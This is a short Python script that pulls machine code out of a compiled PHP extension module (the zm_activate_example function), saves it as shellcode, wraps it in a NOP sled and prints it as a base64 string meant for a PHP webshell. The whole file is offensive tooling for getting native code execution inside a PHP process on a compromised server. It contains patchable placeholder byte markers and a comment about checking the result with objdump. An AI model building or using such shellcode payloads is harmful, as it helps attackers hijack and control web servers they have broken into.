import base64
import struct
import subprocess

BIN_SIZE = 320

file_path = "./modules/example.so"
out = subprocess.check_output(["nm", file_path]).split(b'\n')
for l in out:
	if l.find(b'zm_activate_example') != -1:
		total_size = BIN_SIZE - 24 - 8
		#get symbol start address
		start_offset = int(l.split(b' ').pop(0), 16)
		#get symbol end
		data = open(file_path, "rb").read()
		end_offset = data.find(b"\xc3", start_offset)
		#get shellcode
		shellcode = data[start_offset : end_offset + 1]
		print('Shellcode size: %s' % len(shellcode))
		open('./shellcode.bin', 'wb').write(shellcode)
		#create string for webshell
		str_  = struct.pack('<Q', 0x9090909090909090) 
		str_ += struct.pack('<Q', 0x9090909090909090)
		str_ += shellcode	
		str_ += b'\x90' * (total_size - len(str_))
		print('Total size: %s' % len(str_))
		assert(len(str_) == total_size)		
		pos1 = str_.find(b'\x03\x02\x02\x02')
		pos2 = str_.find(b'\x04\x03\x03\x03')
		pos3 = str_.find(b'\x05\x04\x04\x04')
		pos4 = str_.find(b'\x08\x07\x06\x05')
		assert(0 < pos1 < pos2 < pos3 < pos4)
		print('Full string for PHP script')
		print(base64.b64encode(str_))

# Test shellcode:
# objdump -b binary -m i386:x86-64 -D ./shellcode.bin